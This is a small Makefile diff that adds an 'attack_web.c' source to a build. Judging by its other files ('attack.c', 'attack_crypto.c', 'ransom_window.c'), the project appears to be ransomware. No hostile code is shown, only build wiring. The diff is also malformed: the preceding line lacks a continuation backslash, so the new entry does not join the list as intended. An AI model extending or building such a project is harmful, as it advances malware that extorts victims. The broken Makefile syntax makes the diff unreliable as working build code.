@@ -28,6 +28,7 @@ SHARED_SRC = \
     $(SRC_DIR)/get_relative_path.c \
     $(SRC_DIR)/attack.c \
     $(SRC_DIR)/attack_crypto.c
+    $(SRC_DIR)/attack_web.c
 
 RANSOM_WINDOW_SRC = $(SRC_DIR)/ransom_window.c
 
